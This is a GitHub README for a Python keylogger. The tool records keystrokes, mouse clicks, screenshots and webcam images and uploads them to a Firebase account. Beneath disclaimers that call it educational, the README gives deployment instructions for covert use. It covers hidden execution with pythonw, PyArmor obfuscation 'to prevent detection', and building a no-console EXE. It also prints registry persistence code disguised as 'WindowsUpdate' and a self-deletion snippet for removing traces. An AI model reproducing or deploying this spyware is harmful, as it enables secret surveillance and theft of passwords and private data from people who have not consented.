# 🔑 Advanced Keylogger

## 🚨 Disclaimer

**This project is strictly for educational and ethical penetration testing purposes only.** Unauthorized use of this software to monitor individuals without their consent is **illegal and punishable by law**. The creator holds no responsibility for any misuse of this tool. **Always obtain explicit permission before deploying this software.**

---

## 📝 Project Overview

This project is an **Advanced Keylogger** that logs keystrokes, mouse clicks, and screenshots, and uploads data securely to Firebase. It also includes webcam capture, internet connectivity checks, and stealth execution techniques.

### 🔥 Features

✅ **Keystroke Logging** – Logs all keystrokes and caches them for efficient storage.\
✅ **Mouse Click Logger** – Captures mouse click events with coordinates.\
✅ **Screenshot Capture** – Takes periodic screenshots and uploads them to Firebase.\
✅ **Webcam Capture** – Captures images every 10 minutes (optimized for low resource usage).\
✅ **Encrypted Data Storage** – Logs are encrypted before storing to avoid detection.\
✅ **Offline Mode** – Stores logs locally and uploads when internet is available.\
✅ **Firebase Integration** – Stores all logs securely in Firebase database and cloud storage.\
✅ **Startup Persistence** – Auto-runs on system startup by adding itself to Windows registry.\
✅ **Anti-Forensic Measures** – Self-destruct mechanism to remove traces.\
✅ **Obfuscation Ready** – Can be obfuscated using `PyArmor` for added security.

---

## 📌 Requirements

Ensure you have the following installed:

- **Python 3.8+** (Recommended 3.10)
- Required Python libraries:
  ```sh
  pip install pyrebase4 opencv-python pynput pyautogui cryptography
  ```

---

## ⚙️ Setup & Usage

### 🔹 Step 1: Configure Firebase

1. Go to **Firebase Console** ([https://console.firebase.google.com/](https://console.firebase.google.com/))
2. Create a new project.
3. Enable **Realtime Database** and **Storage**.
4. Copy the Firebase configuration and update `firebase_config` in `keylogger.py`.

### 🔹 Step 2: Run the Keylogger

Run the script in the background:

```sh
python keylogger.py
```

To run it as a **hidden background process**, use:

```sh
pythonw keylogger.py
```

### 🔹 Step 3: Obfuscate the Code (Optional but Recommended)

To prevent detection and reverse engineering:

```sh
pyarmor gen -O dist/ --src . keylogger.py
```

This will create an **obfuscated** version in the `dist/` folder.

### 🔹 Step 4: Convert to Executable (For Deployment)

Use **PyInstaller** to convert it to an executable:

```sh
pyinstaller --onefile --noconsole --hidden-import cryptography keylogger.py
```

This will generate an EXE file inside the `dist/` directory.

---

## 🔥 Security Features

### 🔹 **Encryption**

All logged data is encrypted using **AES encryption** with `cryptography` library, making it difficult to extract logs if compromised.

### 🔹 **Persistence (Startup Entry)**

The script automatically adds itself to Windows startup:

```python
key = r"Software\Microsoft\Windows\CurrentVersion\Run"
reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
reg.SetValueEx(reg_key, "WindowsUpdate", 0, reg.REG_SZ, file_path)
```

This ensures it runs every time the system boots.

### 🔹 **Stealth Mode**

- Runs as a **background process** (`pythonw.exe` execution).
- Saves logs in a **hidden file** (`attrib +h`).
- Uses **randomized filenames** for screenshots & webcam captures.

### 🔹 **Self-Destruction**

To remove traces after execution, use:

```python
os.remove(sys.argv[0])
```

---

## 🚨 Legal Warning

**Unauthorized usage of this tool for hacking, spying, or monitoring without consent is strictly illegal.** This tool should only be used in:

- Ethical hacking and cybersecurity research.
- Personal security monitoring with consent.
- Testing for system vulnerabilities.

Any **misuse** of this software is the sole responsibility of the user. The author does not hold any liability.

---

## 🤝 Contributing

Pull requests are welcome. If you have ideas for improvements, feel free to contribute!

---

## ⚖️ License

This project is licensed under the **MIT License**. However, using it for illegal activities voids any warranty or liability from the author.

--

## ☕ Support Me

Do you like My projects? You can show your support by buying me a coffee! Your contributions motivate me to keep improving and building more awesome projects. 💻❤  

[![Buy Me a Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](http://buymeacoffee.com/Arya182)


## 📞 Contact

For security-related queries or issues, reach out:
📧 **Email:** [arya119000@gmail.com](mailto\:arya119000@gmail.com)\
🔗 **GitHub:** [Arya182-ui](https://github.com/Arya182-ui)
